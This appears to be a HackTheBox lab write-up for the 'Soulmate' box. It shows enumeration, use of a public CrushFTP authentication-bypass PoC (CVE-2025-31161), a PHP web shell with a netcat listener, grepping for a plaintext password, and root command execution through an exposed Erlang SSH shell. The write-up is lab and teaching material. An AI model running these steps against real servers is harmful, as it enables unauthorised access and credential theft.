+<h2 id="section-3-exploitation"><a href="#section-3-exploitation" class="heading-link">3. Exploitation</a></h2>
+<h3 id="section-crushftp-exploit-cve-2025-31161"><a href="#section-crushftp-exploit-cve-2025-31161" class="heading-link">CrushFTP Exploit (CVE-2025-31161)</a></h3>
+<ul>
+<li>Authentication bypass vulnerability in CrushFTP.</li>
+<li>PoC: <a href="https://github.com/Immersive-Labs-Sec/CVE-2025-31161">GitHub CVE-2025-31161</a></li>
+</ul>
+<div class="reader-code"><div class="reader-code-toolbar"><span>shell</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="shell block, horizontally scrollable"><code class="hljs language-shell">python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user crushadmin --new_user prime1 --password prime123
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>[+] Preparing Payloads
+  [-] Warming up the target
+[+] Sending Account Create Request
+  [!] User created successfully
+[+] Exploit Complete you can now login with
+   [*] Username: prime1
+   [*] Password: prime123
+</code></pre></div>
+<p><strong>Access Obtained:</strong></p>
+<ul>
+<li>
+<p>Login successful with credentials prime1:prime123.
+<button type="button" class="reader-image" aria-label="Enlarge image: soulmate_3"><img src="/assets/soulmate/soulmate_3.jpg" alt="soulmate_3" width="1254" height="669" loading="lazy" decoding="async"/><span>Tap to enlarge</span></button></p>
+</li>
+<li>
+<p>File upload limited by CrushFTP configuration.</p>
+</li>
+</ul>
+<hr/>
+<h3 id="section-access-to-bens-account"><a href="#section-access-to-bens-account" class="heading-link">Access to Ben&#x27;s Account</a></h3>
+<ul>
+<li>
+<p>Using CrushFTP&#x27;s user management panel, changed password for user <code>ben</code>.
+<button type="button" class="reader-image" aria-label="Enlarge image: soulmate_4"><img src="/assets/soulmate/soulmate_4.jpg" alt="soulmate_4" width="887" height="456" loading="lazy" decoding="async"/><span>Tap to enlarge</span></button></p>
+</li>
+<li>
+<p>Now possible to upload files directly to WebProd directory.</p>
+</li>
+</ul>
+<p><button type="button" class="reader-image" aria-label="Enlarge image: soulmate_5"><img src="/assets/soulmate/soulmate_5.jpg" alt="soulmate_5" width="900" height="483" loading="lazy" decoding="async"/><span>Tap to enlarge</span></button></p>
+<hr/>
+<p><strong>Reverse Shell Setup:</strong></p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>shell</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="shell block, horizontally scrollable"><code class="hljs language-shell">nc -nvlp 9001
+</code></pre></div>
+<ul>
+<li>Interact with uploaded shell at soulmate.htb/shell_name.php</li>
+</ul>
+<hr/>
+<h4 id="section-tty-upgrade"><a href="#section-tty-upgrade" class="heading-link">TTY Upgrade</a></h4>
+<div class="reader-code"><div class="reader-code-toolbar"><span>python</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="python block, horizontally scrollable"><code class="hljs language-python">python3 -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>
+Ctrl-Z
+stty raw -echo; fg
+reset (<span class="hljs-keyword">if</span> needed)
+export TERM=xterm
+</code></pre></div>
+<h3 id="section-credential-hunting"><a href="#section-credential-hunting" class="heading-link">Credential Hunting</a></h3>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">grep -Ri <span class="hljs-string">&#x27;password&#x27;</span> /usr/local/ 2&gt;/dev/null
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>&lt;SNIP&gt;
+/usr/local/lib/erlang_login/start.escript:        {auth_methods, &quot;publickey,password&quot;},
+/usr/local/lib/erlang_login/start.escript:        {user_passwords, [{&quot;ben&quot;, &quot;HouseH0ldings998&quot;}]},
+&lt;SNIP&gt;
+</code></pre></div>
+<p><strong>Credentials Found:</strong></p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">Username: ben
+Password: HouseH0ldings998
+</code></pre></div>
+<hr/>
+<h3 id="section-ssh-access"><a href="#section-ssh-access" class="heading-link">SSH Access</a></h3>
+<div class="reader-code"><div class="reader-code-toolbar"><span>shell</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="shell block, horizontally scrollable"><code class="hljs language-shell">ssh ben@soulmate.htb
+Password: HouseH0ldings998
+</code></pre></div>
+<p><strong>User Flag:</strong></p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>shell</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="shell block, horizontally scrollable"><code class="hljs language-shell">cat /home/ben/user.txt
+f708d904&lt;REDACTED&gt;
+</code></pre></div>
+<hr/>
+<h2 id="section-4-privilege-escalation"><a href="#section-4-privilege-escalation" class="heading-link">4. Privilege Escalation</a></h2>
+<h3 id="section-system-info"><a href="#section-system-info" class="heading-link">System Info</a></h3>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash"><span class="hljs-built_in">whoami</span> &amp;&amp; <span class="hljs-built_in">id</span>
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>ben
+uid=1000(ben) gid=1000(ben) groups=1000(ben)
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">hostname &amp;&amp; <span class="hljs-built_in">uname</span> -a
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>Linux soulmate 5.15.0-151-generic #161-Ubuntu SMP Tue Jul 22 14:25:40 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+</code></pre></div>
+<hr/>
+<h3 id="section-suid-capabilities"><a href="#section-suid-capabilities" class="heading-link">SUID &amp; Capabilities</a></h3>
+<div class="reader-code"><div class="reader-code-toolbar"><span>shell</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="shell block, horizontally scrollable"><code class="hljs language-shell">find / -perm -4000 -type f 2&gt;/dev/null
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/chsh
+/usr/bin/fusermount3
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/chfn
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/libexec/polkit-agent-helper-1
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>shell</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="shell block, horizontally scrollable"><code class="hljs language-shell">getcap -r / 2&gt;/dev/null
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>/usr/bin/mtr-packet cap_net_raw=ep
+/usr/bin/ping cap_net_raw=ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
+</code></pre></div>
+<p><strong>Findings:</strong></p>
+<ul>
+<li>No unusual SUID binaries or capabilities found.</li>
+</ul>
+<hr/>
+<h3 id="section-local-services"><a href="#section-local-services" class="heading-link">Local Services</a></h3>
+<div class="reader-code"><div class="reader-code-toolbar"><span>shell</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="shell block, horizontally scrollable"><code class="hljs language-shell">ss -tuln
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>&lt;SNIP&gt;
+tcp    LISTEN  0   4096   127.0.0.1:8443    0.0.0.0:*
+tcp    LISTEN  0   5      127.0.0.1:2222    0.0.0.0:*
+tcp    LISTEN  0   4096   127.0.0.1:9090    0.0.0.0:*
+&lt;SNIP&gt;
+</code></pre></div>
+<ul>
+<li>Erlang/SSH service listening on port 2222.</li>
+</ul>
+<hr/>
+<h3 id="section-erlang-service-exploit"><a href="#section-erlang-service-exploit" class="heading-link">Erlang Service Exploit</a></h3>
+<ul>
+<li>Connection via <code>nc 127.0.0.1 2222</code> shows protocol error.</li>
+<li>SSH connection to Erlang service:</li>
+</ul>
+<div class="reader-code"><div class="reader-code-toolbar"><span>shell</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="shell block, horizontally scrollable"><code class="hljs language-shell">ssh 127.0.0.1 -p 2222
+Password: HouseH0ldings998
+</code></pre></div>
+<hr/>
+<h3 id="section-erlang-service-exploit-1"><a href="#section-erlang-service-exploit-1" class="heading-link">Erlang Service Exploit</a></h3>
+<ul>
+<li>Connection via <code>nc 127.0.0.1 2222</code> shows protocol error, indicating the service expects SSH protocol.</li>
+<li>SSH connection to Erlang service using Ben&#x27;s credentials:</li>
+</ul>
+<div class="reader-code"><div class="reader-code-toolbar"><span>shell</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="shell block, horizontally scrollable"><code class="hljs language-shell">ssh 127.0.0.1 -p 2222
+Password: HouseH0ldings998
+</code></pre></div>
+<p><strong>Erlang Shell Access:</strong></p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>erlang</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="erlang block, horizontally scrollable"><code class="hljs language-erlang">Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
+(ssh_runner@soulmate)1&gt;
+</code></pre></div>
+<p><strong>Exploring Shell Capabilities:</strong></p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>erlang</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="erlang block, horizontally scrollable"><code class="hljs language-erlang">(ssh_runner@soulmate)1&gt; help().
+
+** shell internal commands **
+b()        -- display all variable bindings
+e(N)       -- repeat the expression in query &lt;N&gt;
+f()        -- forget all variable bindings
+&lt;SNIP&gt;
+os:cmd(Command) -- execute Command in OS shell
+&lt;SNIP&gt;
+
+</code></pre></div>
+<p><strong>Listing Loaded Modules:</strong></p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>erlang</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="erlang block, horizontally scrollable"><code class="hljs language-erlang">(ssh_runner@soulmate)2&gt; m().
+Module                File
+application           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/application.beam
+application_controller /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/application_controller.beam
+&lt;SNIP&gt;
+os                    /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/os.beam
+&lt;SNIP&gt;
+</code></pre></div>
+<p><strong>Command Execution as Root:</strong></p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>erlang</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="erlang block, horizontally scrollable"><code class="hljs language-erlang">(ssh_runner@soulmate)4&gt; os:cmd(&quot;whoami&quot;).
+&quot;root\n&quot;
+</code></pre></div>
+<p><strong>Root Flag Retrieval:</strong></p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>erlang</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="erlang block, horizontally scrollable"><code class="hljs language-erlang">(ssh_runner@soulmate)5&gt; os:cmd(&quot;cat /root/root.txt&quot;).
+&quot;79d6192f&lt;REDACTED&gt;&quot;
+</code></pre></div>
+<p>The Erlang shell&#x27;s <code>os:cmd/1</code> function allowed direct execution of system commands with root privileges, providing immediate privilege escalation without requiring additional exploits.</p>
+<hr/>
+<h2 id="section-conclusions"><a href="#section-conclusions" class="heading-link">Conclusions</a></h2>
+<ul>
+<li><strong>User Access:</strong> Obtained by exploiting CVE-2025-31161 on CrushFTP and modifying Ben&#x27;s password through management panel.</li>
+<li><strong>Privilege Escalation:</strong> Exploited Erlang service listening on port 2222, allowing command execution as root via <code>os:cmd/1</code> function.</li>
+<li><strong>Key Lessons:</strong>
+<ul>
+<li>Update software to mitigate known vulnerabilities (CVE-2025-31161).</li>
+<li>Restrict permissions of internal services (Erlang) to prevent privilege escalation.
+privilege escalation.</li>
+</ul>
+</li>
+</ul></div><dialog class="reader-image-dialog" aria-label="Enlarged article image"><button type="button" class="reader-image-close" aria-label="Close image"><svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-x"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg></button></dialog></div></div></div></main></div><!--/$--></div></div><script id="article-data" type="application/json">{"kind":"writeup","entry":{"id":"soulmate","title":"Soulmate","platform":"hackthebox","difficulty":"easy","os":"linux","tags":["CrushFTP","Erlang"],"date":"2025-09-11","summary":"Exploited a CrushFTP authentication bypass vulnerability (CVE-2025-31161) to gain initial access, then used an exposed internal Erlang service to escalate privileges to root.","contentPath":"soulmate.md","previewImage":"/assets/previews/writeup-soulmate.png","icon":"/assets/htb/soulmate.png","kind":"writeup","folder":"writeups","route":"boxes/hackthebox/soulmate"},"route":"boxes/hackthebox/soulmate","content":"# Soulmate - HackTheBox Writeup\n\n## 1. External Enumeration\n\n### TCP Aggressive Scan\n```shell\nnmap -A -sV -sC -p- --open -T4 10.129.58.9\n```\n\n```\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)\n|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Soulmate - Find Your Perfect Match\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n```\n\n**Findings / Motivation:**\n- Port 22: Exposed SSH service (OpenSSH 8.9p1).\n- Port 80: HTTP service (nginx 1.18.0) with \"Soulmate\" web application.\n\n---\n\n### UDP Version Scan (Top 100 ports)\n```shell\nnmap -sU -sV -F -T5 --open --max-retries 1 10.129.58.9\n```\n\n```\nAll 100 scanned ports on soulmate.htb (10.129.58.9) are in ignored states.\nNot shown: 92 open|filtered udp ports (no-response), 8 closed udp ports (port-unreach)\n```\n\n**Findings:**\n- No interesting UDP ports detected.\n\n---\n\n## 2. Web Enumeration\n\n### Host Configuration\n```shell\necho '10.129.58.9 soulmate.htb' | sudo tee -a /etc/hosts\n```\n\n---\n\n### WhatWeb Analysis\n```shell\nwhatweb soulmate.htb\n```\n\n```\nhttp://soulmate.htb [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[hello@soulmate.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.58.9], Script, Title[Soulmate - Find Your Perfect Match], nginx[1.18.0]\n```\n\n\n```shell\nwhatweb ftp.soulmate.htb\n```\n\n```\nhttp://ftp.soulmate.htb [302 Found] Cookies[CrushAuth,currentAuth], Country[RESERVED][ZZ], CrushFTP, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[CrushAuth], IP[10.129.58.9], RedirectLocation[/WebInterface/login.html], nginx[1.18.0]\nhttp://ftp.soulmate.htb/WebInterface/login.html [200 OK] Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.58.9], Script[module,text/javascript,text/javascript\u003econst], Title[CrushFTP WebInterface], X-UA-Compatible[chrome=1], nginx[1.18.0]\n```\n\n**Findings:**\n- Main site: Soulmate with Bootstrap framework.\n- Subdomain ftp.soulmate.htb hosting CrushFTP with web interface.\n\n---\n\n### Subdomain Enumeration\n```shell\nffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://soulmate.htb -H 'Host: FUZZ.soulmate.htb' -fs 154\n```\n\n```\nftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 70ms]\n```\n\n**Findings:**\n- Subdomain `ftp.soulmate.htb` discovered, redirects to CrushFTP WebInterface.\n\n---\n\n### Directory Bruteforcing\n```shell\nffuf -u http://soulmate.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt\n```\n\n```\nassets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 33ms]\nindex.php               [Status: 200, Size: 16688, Words: 6110, Lines: 306, Duration: 32ms]\n```\n\n**Findings:**\n- Directory `/assets` and file `index.php` detected.\n\n---\n\n### Application Exploration\n\n- Main Soulmate site allows registration and login.\n\n![soulmate_1](/assets/soulmate/soulmate_1.jpg)\n\n- No XSS vulnerability found.\n- No upload vulnerability found.\n\n- Subdomain ftp hosts CrushFTP with login panel.\n\n![soulmate_2](/assets/soulmate/soulmate_2.png)\n\n---\n\n## 3. Exploitation\n\n### CrushFTP Exploit (CVE-2025-31161)\n- Authentication bypass vulnerability in CrushFTP.\n- PoC: [GitHub CVE-2025-31161](https://github.com/Immersive-Labs-Sec/CVE-2025-31161)\n\n```shell\npython3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user crushadmin --new_user prime1 --password prime123\n```\n\n```\n[+] Preparing Payloads\n  [-] Warming up the target\n[+] Sending Account Create Request\n  [!] User created successfully\n[+] Exploit Complete you can now login with\n   [*] Username: prime1\n   [*] Password: prime123\n```\n\n**Access Obtained:**\n- Login successful with credentials prime1:prime123.\n![soulmate_3](/assets/soulmate/soulmate_3.jpg)\n\n- File upload limited by CrushFTP configuration.\n\n\n---\n### Access to Ben's Account\n- Using CrushFTP's user management panel, changed password for user 